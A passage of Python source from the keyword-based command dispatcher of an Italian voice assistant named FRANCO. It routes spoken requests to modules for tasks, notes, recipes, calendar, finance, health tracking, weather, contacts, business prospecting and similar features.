                if getattr(self, "brain", None):
                    self.brain.ingest_text(f"Progetto utente: {raw}", source="progetto")
            except Exception as _e:
                pass  # suppressed error
            response = self._cmd_brainstorm(project_desc, mode="generale")

        # 21b. Brainstorming / invenzione
        elif any(k in t for k in [
            "inventa ", "inventami ", "ho un'idea ", "ho un progetto",
            "aiutami a inventare", "dammi idee", "idee per",
            "come posso", "come potrei", "brainstorming", "vorrei creare",
            "sto pensando di", "ho bisogno di idee", "soluzioni per",
            "analizza il mio progetto", "cosa ne pensi del progetto",
            "pensa a come", "trova soluzioni", "inventare qualcosa",
            "idee su come", "come migliorare", "come sviluppare",
        ]):
            # Rileva la modalità richiesta
            _bmode = "generale"
            if any(k in t for k in ("tecnico", "technical", "architettura", "codice", "stack")):
                _bmode = "tecnico"
            elif any(k in t for k in ("business", "mercato", "monetizza", "startup")):
                _bmode = "business"
            elif any(k in t for k in ("creativo", "creativa", "laterale", "fuori dagli schemi")):
                _bmode = "creativo"
            elif any(k in t for k in ("critica", "critico", "problema", "rischi", "debolezze")):
                _bmode = "critico"
            _idea_text = self._extract_after(t, [
                "inventa ", "inventami ", "ho un'idea su ", "ho un progetto su ",
                "aiutami a inventare ", "dammi idee su ", "idee per ",
                "come posso ", "come potrei ", "brainstorming su ",
                "vorrei creare ", "sto pensando di ", "ho bisogno di idee su ",
                "soluzioni per ", "analizza il mio progetto ",
                "pensa a come ", "trova soluzioni per ", "inventare qualcosa su ",
                "idee su come ", "come migliorare ", "come sviluppare ",
            ]) or raw
            response = self._cmd_brainstorm(_idea_text, mode=_bmode)

        # 22. Ricerca web inline
        elif any(k in t for k in [
            "cosa è ", "cos'è ", "dimmi di ", "chi è ", "quando è ",
            "dove si trova ", "come funziona ", "spiega ", "definisci ",
            "notizie su ", "notizie di ", "ultime notizie",
            "cerca informazioni su",
        ]):
            response = self._cmd_ai_search(t, raw)

        # 23. Calcolatrice rapida
        elif re.match(r"^[\d\s\+\-\*\/\(\)\.\,\^%]+$", t.strip()) and any(c in t for c in "+-*/"):
            try:
                expr = t.strip().replace(",", ".").replace("^", "**").replace("%", "/100")
                result = eval(expr, {"__builtins__": {}})  # noqa: S307 - expr is sanitized above
                response = f"= {result:g}"
            except Exception as _e:
                response = self._cmd_ai_fallback(raw)

        # 24. Clipboard — copia/incolla
        elif any(k in t for k in ["cosa c'è negli appunti", "mostra appunti", "clipboard", "cosa ho copiato"]):
            try:
                import pyperclip as _pc
                clip = _pc.paste()
                response = f"Appunti: {clip[:300]}" if clip else "Appunti vuoti."
            except Exception as _e:
                response = "Pyperclip non disponibile."

        elif any(k in t for k in ["copia negli appunti", "metti negli appunti", "copia:"]):
            content = self._extract_after(t, ["copia negli appunti ", "metti negli appunti ", "copia: "])
            try:
                import pyperclip as _pc
                _pc.copy(content)
                response = f"Copiato: {content[:80]}"
            except Exception as _e:
                response = "Pyperclip non disponibile."

        # 25. Mostra ora / data estesa
        elif any(k in t for k in ["che settimana siamo", "giorno della settimana", "settimana corrente"]):
            import datetime as _dt
            now = _dt.datetime.now()
            response = (f"Oggi è {now.strftime('%A %d %B %Y')}, "
                        f"settimana {now.isocalendar()[1]} dell'anno.")

        # 26. Svuota conversazione / reset chat
        elif any(k in t for k in ["svuota chat", "cancella conversazione", "reset chat",
                                   "pulisci chat", "nuova conversazione"]):
            try:
                ui = getattr(self, "_ui_ref", None)
                if ui and hasattr(ui, "_chat_messages"):
                    ui._chat_messages.clear()
                self.memory.clear_session()
            except Exception as _e:
                pass  # suppressed error
            response = "Conversazione azzerata. Sono pronto per una nuova sessione."

        # 27. Apri task manager / process explorer
        elif any(k in t for k in ["apri task manager", "process explorer", "gestore attività"]):
            import subprocess as _sp
            try:
                _sp.Popen(["taskmgr.exe"])
                response = "Task Manager avviato."
            except Exception as _e:
                response = f"Impossibile aprire Task Manager: {_e}"

        # 28. Riavvia FRANCO
        elif any(k in t for k in ["riavvia franco", "restart franco", "riavvia te stesso"]):
            import sys as _sys
            response = "Riavvio in corso…"
            try:
                import subprocess as _sp
                _sp.Popen([_sys.executable] + _sys.argv)
                self.state.set("running", False)
            except Exception as _e:
                response = f"Errore riavvio: {_e}"

        # 29. Knowledge Base — cerca nella KB locale
        elif any(k in t for k in [
            "cerca nella knowledge", "cerca nella kb", "cerca nei documenti",
            "cosa sai su ", "cosa hai su ", "informazioni su ",
            "cerca in wikipedia", "wikipedia ", "enciclopedia ",
            "trovami info su", "cerca localmente", "cerca offline",
        ]):
            _kb_query = self._extract_after(t, [
                "cerca nella knowledge ", "cerca nella kb ", "cerca nei documenti ",
                "cosa sai su ", "cosa hai su ", "informazioni su ",
                "cerca in wikipedia ", "wikipedia ", "enciclopedia ",
                "trovami info su ", "cerca localmente ", "cerca offline ",
            ]) or raw
            response = self._cmd_knowledge_search(_kb_query)

        # 30. Knowledge Base — indicizza file
        elif any(k in t for k in ["indicizza file", "aggiungi alla kb", "carica nella kb",
                                   "aggiungi ai documenti", "indicizza documento"]):
            _kb_path = self._extract_after(t, [
                "indicizza file ", "aggiungi alla kb ", "carica nella kb ",
                "aggiungi ai documenti ", "indicizza documento ",
            ]) or ""
            response = self._cmd_kb_ingest(_kb_path) if _kb_path else "Specifica il percorso del file."

        # 31. Stato asset / download
        elif any(k in t for k in ["stato asset", "stato download", "quanto pesa franco",
                                   "quanti giga ha franco", "stato modelli", "stato llm"]):
            response = self._cmd_asset_status()

        # 32. Local AI offline
        elif any(k in t for k in ["modalità offline", "rispondi offline", "usa il modello locale",
                                   "local ai", "senza internet", "llm locale"]):
            _lai_q = self._extract_after(t, [
                "modalità offline ", "rispondi offline ", "usa il modello locale ",
                "local ai ", "senza internet ", "llm locale ",
            ]) or raw
            response = self._cmd_local_ai_query(_lai_q)

        # 33. Stato Local AI
        elif any(k in t for k in ["stato local ai", "stato llm locale", "modello locale caricato"]):
            response = self._cmd_local_ai_status()

        # 34. Statistiche KB
        elif any(k in t for k in ["statistiche kb", "statistiche knowledge", "quanti documenti hai",
                                   "quanti articoli hai"]):
            response = self._cmd_kb_stats()

        # 35. Skill vocali personalizzate — controlla PRIMA del monitor
        # (il match su trigger personalizzati ha precedenza sul testo generico)
        elif (skill_resp := (
            getattr(self, "skills", None) and
            getattr(self.skills, "process_text", lambda x: None)(raw)
        )):
            response = skill_resp

        # 36. Crea/gestisci skill
        elif any(k in t for k in ["crea skill", "nuova skill", "crea automazione",
                                   "lista skill", "mostra skill", "skill disponibili",
                                   "elimina skill", "disabilita skill"]):
            sm = getattr(self, "skills", None)
            if sm is None:
                response = "Skill Manager non disponibile."
            elif any(k in t for k in ["lista skill", "mostra skill", "skill disponibili"]):
                response = sm.skill_list_text()
            elif "crea skill" in t or "nuova skill" in t or "crea automazione" in t:
                response = sm.create_from_voice(raw)
            elif "elimina skill" in t:
                skill_name = self._extract_after(t, ["elimina skill ", "rimuovi skill "]) or ""
                response = (f"Skill '{skill_name}' rimossa." if skill_name and sm.remove_skill(skill_name)
                            else f"Skill '{skill_name}' non trovata.")
            else:
                response = sm.skill_list_text()

        # 43. Cucina e Ricette
        elif any(k in t for k in ["ricetta", "ricette", "come si fa", "come cucino",
                                   "lista spesa", "aggiungi alla spesa", "cosa cucino con",
                                   "ingredienti per", "ingredienti di", "cosa ho in frigo",
                                   "meal plan", "pianifica i pasti"]):
            rc = getattr(self, "recipes", None)
            if rc is None:
                try:
                    from franco_recipes import get_recipes
                    rc = get_recipes()
                    self.recipes = rc
                except Exception as e:
                    response = f"Recipes non disponibile: {e}"
                    rc = None
            if rc:
                if "lista spesa" in t or "aggiungi alla spesa" in t:
                    if "aggiungi alla spesa" in t:
                        item = self._extract_after(t, ["aggiungi alla spesa ", "metti nella spesa "])
                        if item:
                            rc.add_to_shopping(item)
                            response = f"Aggiunto alla lista: {item}"
                        else:
                            response = rc.shopping_list_text()
                    else:
                        response = rc.shopping_list_text()
                elif any(k in t for k in ["cosa cucino con","cosa ho in frigo","ingredienti"]):
                    _ings = re.findall(r'[a-zA-ZÀ-ÿ]{4,}', t)
                    results = rc.find_by_ingredients(_ings, top_k=3)
                    if results:
                        response = ("Con questi ingredienti puoi fare:\n" +
                                    "\n".join(f"  - {r['name']} ({r['prep_min']+r['cook_min']} min)"
                                              for r in results))
                    else:
                        response = "Nessuna ricetta trovata con questi ingredienti."
                elif any(k in t for k in ["ricetta","come si fa","come cucino","ingredienti per"]):
                    _query = self._extract_after(t, [
                        "ricetta di ", "ricetta del ", "ricetta della ", "ricetta ",
                        "come si fa ", "come cucino ", "ingredienti per ", "ingredienti di ",
                    ]) or raw
                    r2 = rc.get(_query)
                    if r2:
                        response = rc.format_recipe(r2)
                    else:
                        results = rc.search(_query, limit=3)
                        if results:
                            response = (f"Ricette trovate per '{_query}':\n" +
                                        "\n".join(f"  - {r3['name']}" for r3 in results))
                        else:
                            response = f"Nessuna ricetta trovata per '{_query}'."
                else:
                    # Lista generica ricette
                    cats = rc.list_categories()
                    response = f"Ho {rc.stats()['ricette']} ricette: {', '.join(cats)}. Chiedimi 'ricetta di [piatto]'."

        # 42. Project Manager
        elif any(k in t for k in ["crea progetto", "nuovo progetto", "lista progetti",
                                   "mostra progetti", "report progetto", "stato progetto",
                                   "avvia sprint", "chiudi sprint", "burndown",
                                   "milestone progetto", "aggiungi milestone"]):
            pm = getattr(self, "projects", None)
            if pm is None:
                try:
                    from franco_projects import get_project_manager
                    pm = get_project_manager()
                    self.projects = pm
                except Exception as e:
                    response = f"Project Manager non disponibile: {e}"
                    pm = None
            if pm:
                if any(k in t for k in ["crea progetto","nuovo progetto"]):
                    pname = self._extract_after(t, ["crea progetto ","nuovo progetto "]) or "Nuovo Progetto"
                    pid2 = pm.create_project(pname.strip())
                    response = f"Progetto #{pid2} creato: '{pname}'."
                elif any(k in t for k in ["lista progetti","mostra progetti"]):
                    projs = pm.list_projects()
                    if not projs:
                        response = "Nessun progetto attivo."
                    else:
                        response = "Progetti attivi:\n" + "\n".join(
                            f"  #{p['id']} {p['name']} (dal {p['start_date']})"
                            for p in projs
                        )
                elif any(k in t for k in ["report progetto","stato progetto"]):
                    _pid_n = int(self._extract_number(t, default=1))
                    response = pm.project_report(_pid_n)
                elif "burndown" in t:
                    _sid_n = int(self._extract_number(t, default=1))
                    response = pm.burndown_text(_sid_n)
                elif "avvia sprint" in t:
                    _pid_n = int(self._extract_number(t, default=1))
                    sid2 = pm.start_sprint(_pid_n, days=14)
                    response = f"Sprint #{sid2} avviato per progetto #{_pid_n} (14 giorni)."
                else:
                    response = pm.status_line()

        # 41. Task Manager avanzato
        elif any(k in t for k in ["aggiungi task", "nuovo task", "crea task", "aggiungi attività",
                                   "mostra task", "lista task", "task attivi", "todos",
                                   "completa task", "fatto task", "segna come fatto",
                                   "task di oggi", "briefing task", "task scaduti",
                                   "elimina task", "cancella task"]):
            tm = getattr(self, "tasks", None)
            if tm is None:
                try:
                    from franco_tasks import get_task_manager
                    tm = get_task_manager()
                    self.tasks = tm
                except Exception as e:
                    response = f"Task Manager non disponibile: {e}"
                    tm = None
            if tm:
                if any(k in t for k in ["aggiungi task","nuovo task","crea task","aggiungi attività"]):
                    _title, _kwargs = tm.parse_from_voice(raw)
                    tid = tm.add(_title, **_kwargs)
                    due_str = f", scadenza {_kwargs['due_date']}" if _kwargs.get('due_date') else ""
                    response = f"Task #{tid} aggiunto: '{_title}'{due_str}."
                elif any(k in t for k in ["mostra task","lista task","task attivi","todos"]):
                    response = tm.task_list_text()
                elif any(k in t for k in ["task di oggi","briefing task"]):
                    response = tm.today_briefing()
                elif any(k in t for k in ["task scaduti","task in ritardo"]):
                    overdue = tm.list_overdue()
                    response = (f"{len(overdue)} task scaduti:\n" +
                                "\n".join(f"  #{t2['id']} {t2['title']} [{t2['due_date']}]"
                                          for t2 in overdue[:5])) if overdue else "Nessun task scaduto!"
                elif any(k in t for k in ["completa task","fatto task","segna come fatto"]):
                    _tid_n = self._extract_number(t, default=-1)
                    if _tid_n > 0 and tm.complete(int(_tid_n)):
                        response = f"Task #{int(_tid_n)} completato!"
                    else:
                        response = "Specifica l'ID del task da completare."
                elif any(k in t for k in ["elimina task","cancella task"]):
                    _tid_n = self._extract_number(t, default=-1)
                    if _tid_n > 0 and tm.delete(int(_tid_n)):
                        response = f"Task #{int(_tid_n)} eliminato."
                    else:
                        response = "Specifica l'ID del task da eliminare."
                else:
                    response = tm.task_list_text()

        # 54. Web Agency — prospecting siti web per locali/attività
        elif any(k in t for k in ["trova prospect", "trova clienti", "cerca clienti",
                                   "cerca locali", "prospect per", "web agency"]):
            wa = getattr(self, "web_agency", None)
            if wa is None:
                try:
                    from franco_web_agency import get_web_agency
                    wa = get_web_agency(omni_ai=getattr(self, "omni", None))
                    self.web_agency = wa
                except Exception as e:
                    response = f"Web Agency non disponibile: {e}"
                    wa = None
            if wa:
                # Estrae città e categoria dal comando, es:
                # "trova 15 ristoranti a Vicenza" / "trova prospect parrucchieri a Milano"
                _m = re.search(
                    r"(\d+)?\s*([a-zà-ù ]+?)\s+a\s+([a-zà-ù' ]+)$",
                    t.replace("trova prospect", "").replace("trova clienti", "")
                     .replace("cerca clienti", "").replace("cerca locali", "")
                     .replace("prospect per", "").replace("web agency", "").strip(),
                )
                if _m:
                    _limit = int(_m.group(1)) if _m.group(1) else 15
                    _category = _m.group(2).strip()
                    _city = _m.group(3).strip().title()
                    self.tts.speak(f"Cerco {_category} a {_city}, un momento.")
                    response = wa.full_report(_category, _city, limit=_limit)
                else:
                    response = ("Dimmi città e categoria, es: 'trova 15 ristoranti a Vicenza' "
                                "oppure 'trova prospect parrucchieri a Milano'.")

        # 54b. Web Agency — genera demo siti per i migliori prospect
        elif any(k in t for k in ["genera demo", "crea demo sito", "crea sito demo",
                                   "fammi vedere una demo"]):
            wa = getattr(self, "web_agency", None)
            if wa is None:
                try:
                    from franco_web_agency import get_web_agency
                    wa = get_web_agency(omni_ai=getattr(self, "omni", None))
                    self.web_agency = wa
                except Exception as e:
                    response = f"Web Agency non disponibile: {e}"
                    wa = None
            if wa:
                _m = re.search(
                    r"([a-zà-ù ]+?)\s+a\s+([a-zà-ù' ]+)$",
                    t.replace("genera demo", "").replace("crea demo sito", "")
                     .replace("crea sito demo", "").replace("fammi vedere una demo", "").strip(),
                )
                if _m:
                    _category = _m.group(1).strip()
                    _city = _m.group(2).strip().title()
                    self.tts.speak(f"Genero le demo per {_category} a {_city}, un momento.")
                    paths = wa.build_demo_for_top(_category, _city, n=3)
                    response = (f"Generate {len(paths)} demo (solo file locali, non pubblicati):\n"
                                + "\n".join(paths)) if paths else "Nessuna demo generata."
                else:
                    response = "Dimmi categoria e città, es: 'genera demo parrucchieri a Vicenza'."

        # 54c. Outreach — bozze messaggi di contatto (mai invio automatico)
        elif any(k in t for k in ["prepara messaggi", "bozze contatto", "mostra bozze",
                                   "bozze in attesa", "bozze pendenti"]):
            od = getattr(self, "outreach", None)
            if od is None:
                try:
                    from franco_outreach_drafts import get_outreach_drafts
                    od = get_outreach_drafts()
                    self.outreach = od
                except Exception as e:
                    response = f"Outreach non disponibile: {e}"
                    od = None
            if od:
                response = od.summary_text()

        # 53. Contacts — rubrica contatti
        elif any(k in t for k in ["aggiungi contatto", "nuovo contatto", "crea contatto",
                                   "cerca contatto", "chi è", "telefono di",
                                   "email di", "mostra contatto", "lista contatti",
                                   "i miei contatti", "contatto preferito",
                                   "compleanni prossimi", "compleanno di",
                                   "cancella contatto", "elimina contatto"]):
            ct = getattr(self, "contacts", None)
            if ct is None:
                try:
                    from franco_contacts import get_contacts
                    ct = get_contacts()
                    self.contacts = ct
                except Exception as e:
                    response = f"Contacts non disponibile: {e}"
                    ct = None
            if ct:
                if any(k in t for k in ["aggiungi contatto","nuovo contatto","crea contatto"]):
                    _name = self._extract_after(t, [
                        "aggiungi contatto ","nuovo contatto ","crea contatto "
                    ]) or ""
                    if _name:
                        parts = _name.strip().split()
                        fn = parts[0]; ln = " ".join(parts[1:]) if len(parts)>1 else ""
                        cid = ct.add(fn, last_name=ln)
                        response = f"Contatto #{cid} creato: '{_name.strip()}'."
                    else:
                        response = "Specifica il nome del contatto."
                elif any(k in t for k in ["cerca contatto","chi è","telefono di","email di"]):
                    _q = self._extract_after(t, ["cerca contatto ","chi è ","telefono di ","email di "]) or ""
                    response = ct.search_text(_q) if _q else ct.list_text()
                elif any(k in t for k in ["mostra contatto"]):
                    _cid_n = self._extract_number(t, default=-1)
                    response = ct.show_text(int(_cid_n)) if _cid_n > 0 else ct.list_text()
                elif any(k in t for k in ["lista contatti","i miei contatti"]):
                    response = ct.list_text()
                elif any(k in t for k in ["compleanni prossimi","compleanno di"]):
                    bdays = ct.birthdays_upcoming(30)
                    response = ("Compleanni prossimi (30gg):\n" +
                                "\n".join(f"  {b['first_name']} {b['last_name']}: {b['next_birthday']} ({b['days_until']}gg)"
                                          for b in bdays)) if bdays else "Nessun compleanno nei prossimi 30 giorni."
                elif any(k in t for k in ["cancella contatto","elimina contatto"]):
                    _cid_n = self._extract_number(t, default=-1)
                    if _cid_n > 0 and ct.delete(int(_cid_n)):
                        response = f"Contatto #{int(_cid_n)} eliminato."
                    else:
                        response = "Specifica l'ID del contatto da eliminare."
                else:
                    response = ct.list_text()

        # 52. Pomodoro — timer focus e produttività
        elif any(k in t for k in ["avvia pomodoro", "inizia pomodoro", "start pomodoro",
                                   "pausa pomodoro", "ferma pomodoro", "stop pomodoro",
                                   "riprendi pomodoro", "stato pomodoro", "timer focus",
                                   "quanti pomodori", "statistiche pomodoro", "focus tracker",
                                   "registra sessione focus"]):
            pm = getattr(self, "pomodoro", None)
            if pm is None:
                try:
                    from franco_pomodoro import get_pomodoro
                    pm = get_pomodoro()
                    self.pomodoro = pm
                except Exception as e:
                    response = f"Pomodoro non disponibile: {e}"
                    pm = None
            if pm:
                if any(k in t for k in ["avvia pomodoro","inizia pomodoro","start pomodoro","timer focus"]):
                    _task = self._extract_after(t, [
                        "avvia pomodoro ", "inizia pomodoro ", "start pomodoro ",
                        "timer focus ", "pomodoro su ",
                    ]) or "Focus"
                    response = pm.timer.start_work(_task.strip())
                elif any(k in t for k in ["pausa pomodoro"]):
                    response = pm.timer.pause()
                elif any(k in t for k in ["riprendi pomodoro"]):
                    response = pm.timer.resume()
                elif any(k in t for k in ["ferma pomodoro","stop pomodoro"]):
                    r = pm.timer.stop()
                    response = f"Timer fermato dopo {r['elapsed_m']} min."
                elif any(k in t for k in ["stato pomodoro"]):
                    response = pm.timer.status_text()
                elif any(k in t for k in ["quanti pomodori","statistiche pomodoro","focus tracker"]):
                    response = pm.dashboard_text()
                elif "registra sessione" in t:
                    mins_n = int(self._extract_number(t, default=25))
                    pm.log_manual("Sessione manuale", mins_n)
                    response = f"Sessione focus di {mins_n} min registrata."
                else:
                    response = pm.dashboard_text()

        # 51. Notes — appunti, note, notebook
        elif any(k in t for k in ["nuova nota", "crea nota", "aggiungi nota",
                                   "prendi nota", "nota rapida",
                                   "mostra nota", "leggi nota", "apri nota",
                                   "lista note", "le mie note",
                                   "cerca nota", "cerca nelle note",
                                   "pinna nota", "elimina nota", "cancella nota",
                                   "aggiungi a nota"]):
            nm = getattr(self, "notes_mod", None)
            if nm is None:
                try:
                    from franco_notes import get_notes
                    nm = get_notes()
                    self.notes_mod = nm
                except Exception as e:
                    response = f"Notes non disponibile: {e}"
                    nm = None
            if nm:
                if any(k in t for k in ["nuova nota","crea nota","aggiungi nota","prendi nota","nota rapida"]):
                    _title = self._extract_after(t, [
                        "nuova nota ", "crea nota ", "aggiungi nota ",
                        "prendi nota ", "nota rapida ", "nota ",
                    ]) or "Nota veloce"
                    nid = nm.add(_title.strip())
                    response = f"Nota #{nid} creata: '{_title[:50]}'."
                elif any(k in t for k in ["mostra nota","leggi nota","apri nota"]):
                    _nid_n = self._extract_number(t, default=-1)
                    if _nid_n > 0:
                        response = nm.show_text(int(_nid_n))
                    else:
                        response = nm.list_text()
                elif any(k in t for k in ["lista note","le mie note"]):
                    response = nm.list_text()
                elif any(k in t for k in ["cerca nota","cerca nelle note"]):
                    _q = self._extract_after(t, ["cerca nota ","cerca nelle note ","cerca "]) or ""
                    if _q:
                        results = nm.search(_q, limit=5)
                        response = ("\n".join(f"#{n['id']} {n['title']}" for n in results)
                                    if results else f"Nessuna nota trovata per '{_q}'.")
                    else:
                        response = "Specifica cosa cercare nelle note."
                elif "elimina nota" in t or "cancella nota" in t:
                    _nid_n = self._extract_number(t, default=-1)
                    if _nid_n > 0 and nm.delete(int(_nid_n)):
                        response = f"Nota #{int(_nid_n)} eliminata."
                    else:
                        response = "Specifica l'ID della nota da eliminare."
                else:
                    response = nm.list_text()

        # 50. Quotes — citazioni motivazionali e filosofiche
        elif any(k in t for k in ["citazione del giorno", "dimmi una citazione",
                                   "citazione motivazionale", "citazione di",
                                   "frase del giorno", "dimmi una frase",
                                   "cerca citazione", "citazioni di",
                                   "frase motivazionale", "ispirami"]):
            qm = getattr(self, "quotes", None)
            if qm is None:
                try:
                    from franco_quotes import get_quotes
                    qm = get_quotes()
                    self.quotes = qm
                except Exception as e:
                    response = f"Quotes non disponibile: {e}"
                    qm = None
            if qm:
                if any(k in t for k in ["citazione del giorno","frase del giorno"]):
                    response = qm.fmt(qm.quote_of_day())
                elif any(k in t for k in ["cerca citazione","cerca frase"]):
                    _q_str = self._extract_after(t, ["cerca citazione ","cerca frase "]) or ""
                    results = qm.search(_q_str, limit=3) if _q_str else []
                    response = "\n\n".join(qm.fmt(r) for r in results) if results else f"Nessuna citazione trovata per '{_q_str}'."
                elif "citazioni di" in t or "citazione di" in t:
                    _auth = self._extract_after(t, ["citazioni di ","citazione di "]) or ""
                    results = qm.by_author(_auth, limit=3) if _auth else []
                    response = "\n\n".join(qm.fmt(r) for r in results) if results else f"Nessuna citazione trovata per '{_auth}'."
                elif any(k in t for k in ["motivazionale","ispirami"]):
                    response = qm.fmt(qm.random(category="motivazione", lang="it"))
                elif "filosofia" in t or "filosofica" in t:
                    response = qm.fmt(qm.random(category="filosofia"))
                elif "programmazione" in t or "coding" in t:
                    response = qm.fmt(qm.random(category="programmazione"))
                else:
                    response = qm.fmt(qm.random(lang="it"))

        # 49. Bookmarks — segnalibri e link
        elif any(k in t for k in ["salva segnalibro", "aggiungi segnalibro", "salva link",
                                   "lista segnalibri", "mostra segnalibri",
                                   "cerca segnalibro", "cerca link",
                                   "pinna segnalibro", "elimina segnalibro"]):
            bms = getattr(self, "bookmarks", None)
            if bms is None:
                try:
                    from franco_bookmarks import get_bookmarks
                    bms = get_bookmarks()
                    self.bookmarks = bms
                except Exception as e:
                    response = f"Bookmarks non disponibile: {e}"
                    bms = None
            if bms:
                if any(k in t for k in ["salva segnalibro","aggiungi segnalibro","salva link"]):
                    # Cerca URL nel testo
                    _url_m = re.search(r'https?://\S+', raw)
                    if _url_m:
                        _url = _url_m.group(0)
                        bid = bms.add(_url)
                        response = f"Segnalibro #{bid} salvato: {_url[:60]}"
                    else:
                        response = "Specifica l'URL da salvare (es. 'salva segnalibro https://...')."
                elif any(k in t for k in ["cerca segnalibro","cerca link"]):
                    _q = self._extract_after(t, ["cerca segnalibro ","cerca link "]) or ""
                    response = bms.search_text(_q) if _q else "Specifica cosa cercare."
                elif any(k in t for k in ["lista segnalibri","mostra segnalibri"]):
                    response = bms.list_text()
                elif "pinna segnalibro" in t:
                    _bid_n = self._extract_number(t, default=-1)
                    if _bid_n > 0:
                        bms.update(int(_bid_n), pinned=True)
                        response = f"Segnalibro #{int(_bid_n)} pinnato."
                    else:
                        response = "Specifica l'ID del segnalibro da pinnare."
                elif "elimina segnalibro" in t:
                    _bid_n = self._extract_number(t, default=-1)
                    if _bid_n > 0 and bms.delete(int(_bid_n)):
                        response = f"Segnalibro #{int(_bid_n)} eliminato."
                    else:
                        response = "Specifica l'ID del segnalibro da eliminare."
                else:
                    response = bms.list_text()

        # 48. Meteo — previsioni, temperatura, condizioni
        elif any(k in t for k in ["che tempo fa", "meteo", "previsioni", "temperatura",
                                   "piove", "nevica", "fa caldo", "fa freddo",
                                   "previsioni domani", "previsioni settimana",
                                   "allerta meteo", "vento", "umidità"]):
            wm = getattr(self, "weather_mod", None)
            if wm is None:
                try:
                    from franco_weather import get_weather as _gw
                    wm = _gw()
                    self.weather_mod = wm
                except Exception as e:
                    response = f"Meteo non disponibile: {e}"
                    wm = None
            if wm:
                # Estrai città dal testo
                _city = None
                _known_cities = ["milano","roma","torino","napoli","firenze","venezia",
                                  "bologna","genova","palermo","bari","cagliari","verona",
                                  "brescia","padova","trieste","catania","modena","parma",
                                  "bergamo","london","paris","berlin","new york","tokyo"]
                for _c in _known_cities:
                    if _c in t:
                        _city = _c
                        break
                if any(k in t for k in ["previsioni","prossimi giorni","settimana"]):
                    response = wm.forecast_text(_city, days=5)
                else:
                    response = wm.current_text(_city)

        # 47. Health — salute, fitness, farmaci
        elif any(k in t for k in ["ho dormito","sonno di","ore di sonno",
                                   "ho fatto passi","oggi ho camminato","passi oggi",
                                   "peso oggi","mi peso","sto pesando",
                                   "bevuto acqua","ho bevuto","acqua oggi",
                                   "umore oggi","come mi sento","mi sento",
                                   "allenamento oggi","ho corso","ho fatto palestra",
                                   "salute","dashboard salute","farmaci",
                                   "preso farmaco","ho preso"]):
            hl = getattr(self, "health", None)
            if hl is None:
                try:
                    from franco_health import get_health
                    hl = get_health()
                    self.health = hl
                except Exception as e:
                    response = f"Health tracker non disponibile: {e}"
                    hl = None
            if hl:
                action, kwargs = hl.parse_from_voice(raw)
                if action == "sleep":
                    hl.log_sleep(**kwargs)
                    response = f"Sonno registrato: {kwargs['hours']}h, qualità {kwargs['quality']}/5."
                elif action == "steps":
                    hl.log_steps(kwargs["steps"])
                    response = f"Passi registrati: {kwargs['steps']:,} oggi."
                elif action == "weight":
                    hl.log_weight(kwargs["kg"])
                    response = f"Peso registrato: {kwargs['kg']} kg."
                elif action == "water":
                    total = hl.log_water(kwargs["ml"])
                    response = f"Acqua aggiunta: {kwargs['ml']} ml (totale oggi: {total} ml)."
                elif action == "mood":
                    hl.log_mood(kwargs["mood"])
                    from franco_health import UMORE_LABELS
                    response = f"Umore registrato: {UMORE_LABELS.get(kwargs['mood'], '?')}."
                elif action == "workout":
                    hl.log_workout(**kwargs)
                    response = f"Allenamento registrato: {kwargs['workout_type']} {kwargs['duration_m']} min."
                else:
                    response = hl.dashboard_text()

        # 46. Finance — spese, entrate, budget
        elif any(k in t for k in ["ho speso", "aggiungi spesa", "registra spesa",
                                   "ho pagato", "ho comprato", "entrata di",
                                   "ho guadagnato", "aggiungi entrata",
                                   "riepilogo finanze", "finanze mese", "resoconto spese",
                                   "ultime spese", "budget mensile", "imposta budget",
                                   "quanto ho speso", "saldo mese"]):
            fn = getattr(self, "finance", None)
            if fn is None:
                try:
                    from franco_finance import get_finance
                    fn = get_finance()
                    self.finance = fn
                except Exception as e:
                    response = f"Finance non disponibile: {e}"
                    fn = None
            if fn:
                if any(k in t for k in ["riepilogo finanze","finanze mese","saldo mese","quanto ho speso"]):
                    response = fn.summary_text()
                elif any(k in t for k in ["ultime spese","resoconto spese"]):
                    response = fn.recent_text(limit=7)
                elif any(k in t for k in ["budget mensile","imposta budget","stato budget"]):
                    response = fn.budget_text()
                elif any(k in t for k in ["ho guadagnato","aggiungi entrata","entrata di"]):
                    tx_type, amount, desc, cat = fn.parse_from_voice(raw)
                    if amount > 0:
                        tid = fn.add_income(amount, desc, category=cat)
                        response = f"Entrata #{tid} registrata: +€{amount:.2f} ({cat})."
                    else:
                        response = "Specifica l'importo dell'entrata."
                else:
                    tx_type, amount, desc, cat = fn.parse_from_voice(raw)
                    if amount > 0:
                        tid = fn.add_expense(amount, desc, category=cat)
                        response = f"Spesa #{tid} registrata: -€{amount:.2f} [{cat}] — {desc[:40]}."
                    else:
                        response = "Specifica l'importo della spesa (es. 'ho speso 12,50 al supermercato')."

        # 45. Calendario — eventi, appuntamenti, promemoria
        elif any(k in t for k in ["aggiungi evento", "nuovo evento", "crea evento",
                                   "aggiungi appuntamento", "nuovo appuntamento",
                                   "eventi di oggi", "calendario oggi", "cosa ho oggi",
                                   "settimana calendario", "vista settimana",
                                   "prossimi eventi", "quando ho", "agenda",
                                   "cancella evento", "elimina evento"]):
            cl = getattr(self, "calendar", None)
            if cl is None:
                try:
                    from franco_calendar import get_calendar
                    cl = get_calendar()
                    self.calendar = cl
                except Exception as e:
                    response = f"Calendario non disponibile: {e}"
                    cl = None
            if cl:
                if any(k in t for k in ["aggiungi evento","nuovo evento","crea evento",
                                         "aggiungi appuntamento","nuovo appuntamento"]):
                    _title, _kwargs = cl.parse_from_voice(raw)
                    eid = cl.add_event(_title, **_kwargs)
                    response = f"Evento #{eid} aggiunto: '{_title}' ({_kwargs.get('start_dt','?')[:16]})."
                elif any(k in t for k in ["eventi di oggi","calendario oggi","cosa ho oggi"]):
                    response = cl.today_text()
                elif any(k in t for k in ["settimana calendario","vista settimana","agenda"]):
                    response = cl.week_text()
                elif any(k in t for k in ["prossimi eventi","quando ho"]):
                    days_n = int(self._extract_number(t, default=7))
                    response = cl.upcoming_text(days=days_n)
                elif any(k in t for k in ["cancella evento","elimina evento"]):
                    _eid_n = self._extract_number(t, default=-1)
                    if _eid_n > 0 and cl.cancel_event(int(_eid_n)):
                        response = f"Evento #{int(_eid_n)} cancellato."
                    else:
                        response = "Specifica l'ID dell'evento da cancellare."
                else:
                    response = cl.upcoming_text(days=7)

        # 44. News — feed RSS, digest, ricerca notizie
        elif any(k in t for k in ["ultime notizie", "notizie di oggi", "notizie tech",
                                   "notizie italia", "notizie mondo", "notizie scienza",
                                   "aggiorna notizie", "scarica notizie", "refresh notizie",
                                   "cerca notizia", "cerca notizie", "digest notizie",
